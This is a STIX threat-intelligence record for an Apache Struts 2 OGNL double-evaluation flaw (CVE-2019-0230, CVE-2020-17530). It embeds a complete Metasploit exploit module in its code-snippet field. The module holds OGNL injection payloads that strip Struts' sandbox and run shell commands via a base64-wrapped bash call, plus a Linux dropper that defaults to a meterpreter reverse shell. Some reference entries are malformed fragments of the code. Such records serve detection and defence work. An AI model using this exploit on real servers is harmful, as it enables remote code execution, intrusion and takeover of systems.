{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--55d984e3-16a3-437d-933b-6fef01be1032",
    "created": "2024-08-14T17:11:42.679768Z",
    "modified": "2024-08-14T17:11:42.679772Z",
    "name": "Apache Struts 2 Forced Multi OGNL Evaluation",
    "description": " The Apache Struts framework, when forced, performs double evaluation of attributes' values assigned to certain tags attributes such as id. It is therefore possible to pass in a value to Struts that will be evaluated again when a tag's attributes are rendered. With a carefully crafted request, this can lead to Remote Code Execution (RCE).  This vulnerability is application dependant. A server side template must make an affected use of request data to render an HTML tag attribute. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/struts2_multi_eval_ognl.rb",
            "external_id": "struts2_multi_eval_ognl.rb"
        },
        {
            "source_name": "MatthiasKaiser",
            "external_id": "#discoveryofCVE-2019-0230"
        },
        {
            "source_name": "AlvaroMu\u00f1oz",
            "external_id": "#(@pwntester)discoveryofCVE-2020-17530"
        },
        {
            "source_name": "ka1n4t",
            "external_id": "#PoCofCVE-2020-17530"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-0230"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-17530"
        },
        {
            "source_name": "reference",
            "url": "https://cwiki.apache.org/confluence/display/WW/S2-059"
        },
        {
            "source_name": "reference",
            "url": "https://cwiki.apache.org/confluence/display/WW/S2-061"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/vulhub/vulhub/tree/master/struts2/s2-059"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/vulhub/vulhub/tree/master/struts2/s2-061"
        },
        {
            "source_name": "reference",
            "url": "https://securitylab.github.com/advisories/GHSL-2020-205-double-eval-dynattrs-struts2"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/ka1n4t/CVE-2020-17530"
        },
        {
            "source_name": "DisclosureDate=>2020-09-14",
            "external_id": "#CVE-2019-0230NVDpublicationdate"
        },
        {
            "source_name": "res=send_request_cgi(build_http_request(datastoreCVE",
            "external_id": "\"#{num1}*#{num2}\"))"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Apache Struts 2 Forced Multi OGNL Evaluation',\n        'Description' => %q{\n          The Apache Struts framework, when forced, performs double evaluation of attributes' values assigned to certain tags\n          attributes such as id. It is therefore possible to pass in a value to Struts that will be evaluated again when a\n          tag's attributes are rendered. With a carefully crafted request, this can lead to Remote Code Execution (RCE).\n\n          This vulnerability is application dependant. A server side template must make an affected use of request data to\n          render an HTML tag attribute.\n        },\n        'Author' => [\n          'Spencer McIntyre', # Metasploit module\n          'Matthias Kaiser', # discovery of CVE-2019-0230\n          'Alvaro Mu\u00f1oz', # (@pwntester) discovery of CVE-2020-17530\n          'ka1n4t', # PoC of CVE-2020-17530\n        ],\n        'References' => [\n          ['CVE', '2019-0230'],\n          ['CVE', '2020-17530'],\n          ['URL', 'https://cwiki.apache.org/confluence/display/WW/S2-059'],\n          ['URL', 'https://cwiki.apache.org/confluence/display/WW/S2-061'],\n          ['URL', 'https://github.com/vulhub/vulhub/tree/master/struts2/s2-059'],\n          ['URL', 'https://github.com/vulhub/vulhub/tree/master/struts2/s2-061'],\n          ['URL', 'https://securitylab.github.com/advisories/GHSL-2020-205-double-eval-dynattrs-struts2'],\n          ['URL', 'https://github.com/ka1n4t/CVE-2020-17530'],\n        ],\n        'Privileged' => false,\n        'Targets' => [\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :linux_dropper,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ]\n        ],\n        'DisclosureDate' => '2020-09-14', # CVE-2019-0230 NVD publication date\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE, ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS, ],\n          'Reliability' => [ REPEATABLE_SESSION, ]\n        },\n        'DefaultTarget' => 0\n      )\n    )\n\n    register_options([\n      Opt::RPORT(8080),\n      OptString.new('TARGETURI', [ true, 'A valid base path to a struts application', '/' ]),\n      OptString.new('NAME', [ true, 'The HTTP query parameter or form data name', 'id']),\n      OptEnum.new('CVE', [ true, 'Vulnerability to use', 'CVE-2020-17530', ['CVE-2020-17530', 'CVE-2019-0230']])\n    ])\n    register_advanced_options([\n      OptFloat.new('CMDSTAGER::DELAY', [ true, 'Delay between command executions', 0.5 ]),\n      OptString.new('HttpCookie', [false, 'An optional cookie to include when making the HTTP request'])\n    ])\n  end\n\n  def check\n    num1 = rand(1000..9999)\n    num2 = rand(1000..9999)\n\n    res = send_request_cgi(build_http_request(datastore['CVE'], \"#{num1}*#{num2}\"))\n    if res.nil?\n      return CheckCode::Unknown\n    elsif res.body.scan(/([\"'])\\s*#{(num1 * num2)}\\s*\\1/).empty?\n      return CheckCode::Safe\n    end\n\n    return CheckCode::Appears\n  end\n\n  def exploit\n    cve = datastore['CVE']\n    print_status(\"Executing #{target.name} for #{datastore['PAYLOAD']} using #{cve}\")\n\n    if cve == 'CVE-2019-0230'\n      ognl = []\n      ognl << '#context=#attr[\\'struts.valueStack\\'].context'\n      ognl << '#container=#context[\\'com.opensymphony.xwork2.ActionContext.container\\']'\n      ognl << '#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)'\n      ognl << '#ognlUtil.setExcludedClasses(\\'\\')'\n      ognl << '#ognlUtil.setExcludedPackageNames(\\'\\')'\n      res = send_request_cgi(build_http_request(cve, ognl))\n      fail_with(Failure::UnexpectedReply, 'Failed to execute the OGNL preamble') unless res&.code == 200\n    end\n\n    case target['Type']\n    when :unix_cmd\n      execute_command(payload.encoded, { cve: cve })\n    when :linux_dropper\n      execute_cmdstager({ cve: cve, delay: datastore['CMDSTAGER::DELAY'], linemax: 512 })\n    end\n  end\n\n  def execute_command(cmd, opts = {})\n    send_request_cgi(build_http_request(opts[:cve], build_ognl(opts[:cve], cmd)), 5)\n  end\n\n  def build_http_request(cve, ognl)\n    ognl = ognl.map { |part| \"(#{part})\" }.join('.') if ognl.is_a? Array\n\n    http_request_parameters = { 'uri' => normalize_uri(target_uri.path) }\n    http_request_parameters['cookie'] = datastore['HttpCookie'] unless datastore['HttpCookie'].blank?\n    if cve == 'CVE-2019-0230'\n      http_request_parameters['method'] = 'GET'\n      http_request_parameters['vars_get'] = { datastore['NAME'] => \"%{#{ognl}}\" }\n    elsif cve == 'CVE-2020-17530'\n      http_request_parameters['method'] = 'POST'\n      http_request_parameters['vars_post'] = { datastore['NAME'] => \"%{#{ognl}}\" }\n    end\n    http_request_parameters\n  end\n\n  def build_ognl(cve, cmd)\n    cmd = \"bash -c {echo,#{Rex::Text.encode_base64(cmd)}}|{base64,-d}|bash\"\n    ognl = []\n    if cve == 'CVE-2019-0230'\n      ognl << '#context=#attr[\\'struts.valueStack\\'].context'\n      ognl << '#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)'\n      ognl << \"@java.lang.Runtime@getRuntime().exec(\\\"#{cmd}\\\")\"\n    elsif cve == 'CVE-2020-17530'\n      ognl << '#instancemanager=#application[\"org.apache.tomcat.InstanceManager\"]'\n      ognl << '#stack=#attr[\"com.opensymphony.xwork2.util.ValueStack.ValueStack\"]'\n      ognl << '#bean=#instancemanager.newInstance(\"org.apache.commons.collections.BeanMap\")'\n      ognl << '#bean.setBean(#stack)'\n      ognl << '#context=#bean.get(\"context\")'\n      ognl << '#bean.setBean(#context)'\n      ognl << '#macc=#bean.get(\"memberAccess\")'\n      ognl << '#bean.setBean(#macc)'\n      ognl << '#emptyset=#instancemanager.newInstance(\"java.util.HashSet\")'\n      ognl << '#bean.put(\"excludedClasses\",#emptyset)'\n      ognl << '#bean.put(\"excludedPackageNames\",#emptyset)'\n      ognl << '#execute=#instancemanager.newInstance(\"freemarker.template.utility.Execute\")'\n      ognl << \"#execute.exec({\\\"#{cmd}\\\"})\"\n    end\n\n    ognl\n  end\nend\n",
    "x_mitre_platforms": [
        "linux'"
    ]
}